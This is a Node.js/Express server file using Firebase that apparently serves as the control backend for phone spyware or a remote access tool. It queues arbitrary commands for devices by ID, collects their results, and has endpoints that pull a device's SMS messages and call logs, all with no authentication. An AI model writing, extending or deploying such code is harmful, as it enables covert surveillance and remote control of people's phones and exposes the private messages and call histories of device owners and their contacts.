const express = require('express');
const admin = require('firebase-admin');
const app = express();
const PORT = process.env.PORT || 3000;

// Initialize Firebase Admin
const serviceAccount = require('./serviceAccountKey.json'); // Make sure this file exists
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // Replace with your DB URL
});

const db = admin.database();
app.use(express.json());

// Store for polling results (in-memory, can use Redis in production)
let resultStore = {};

// ================== API for Termux ==================

// Send command to device
app.post('/api/command', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) {
    return res.status(400).json({ error: 'deviceId and command required' });
  }

  try {
    // Push command to Firebase under device's commands
    const commandsRef = db.ref(`commands/${deviceId}`);
    const newCommandRef = await commandsRef.push({
      command,
      timestamp: admin.database.ServerValue.TIMESTAMP,
      status: 'pending'
    });
    console.log(`Command queued for ${deviceId}: ${command}`);

    // Also store in resultStore for polling (optional)
    resultStore[`${deviceId}_lastCommand`] = command;

    res.json({ status: 'queued', deviceId, command, firebaseKey: newCommandRef.key });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error.message });
  }
});

// Poll for command result (Termux long polling)
app.get('/api/poll/:deviceId', (req, res) => {
  const deviceId = req.params.deviceId;
  const timeout = 30000; // 30 seconds

  // Check if there's a result already (from Firebase listener)
  if (resultStore[deviceId]) {
    const result = resultStore[deviceId];
    delete resultStore[deviceId];
    return res.json({ result });
  }

  // Otherwise wait for result via Firebase listener
  const resultRef = db.ref(`results/${deviceId}`).limitToLast(1);
  let responded = false;

  const listener = resultRef.on('child_added', (snapshot) => {
    if (!responded) {
      responded = true;
      clearTimeout(timer);
      resultRef.off('child_added', listener);
      const result = snapshot.val();
      res.json({ result });
    }
  });

  const timer = setTimeout(() => {
    if (!responded) {
      responded = true;
      resultRef.off('child_added', listener);
      res.json({ result: null }); // No result within timeout
    }
  }, timeout);

  req.on('close', () => {
    clearTimeout(timer);
    resultRef.off('child_added', listener);
  });
});

// ================== API for App to post results ==================
// (App will write directly to Firebase, but we can also accept HTTP if needed)
app.post('/api/result', (req, res) => {
  const { deviceId, command, result, error } = req.body;
  // Store in memory for polling
  resultStore[deviceId] = { command, result, error, timestamp: Date.now() };
  res.sendStatus(200);
});

// ================== SMS & Call Logs Endpoints ==================

// Request SMS list from device
app.get('/api/sms/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();

  try {
    // Write request to Firebase
    await db.ref(`requests/${deviceId}/sms`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });

    // Wait for response (poll Firebase)
    const responseRef = db.ref(`responses/${deviceId}/sms`);
    const timeout = 10000; // 10 seconds
    let responded = false;

    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          // Delete after reading? Optional
          responseRef.remove();
          res.json(data.smsList || []);
        }
      }
    });

    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        res.status(408).json({ error: 'Timeout waiting for SMS' });
      }
    }, timeout);

  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Similarly for call logs
app.get('/api/calls/:deviceId', async (req, res) => {
  const deviceId = req.params.deviceId;
  const requestId = Date.now().toString();

  try {
    await db.ref(`requests/${deviceId}/calls`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });

    const responseRef = db.ref(`responses/${deviceId}/calls`);
    const timeout = 10000;
    let responded = false;

    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          res.json(data.callList || []);
        }
      }
    });

    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        res.status(408).json({ error: 'Timeout waiting for call logs' });
      }
    }, timeout);

  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Root
app.get('/', (req, res) => res.send('Firebase Server Running'));

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));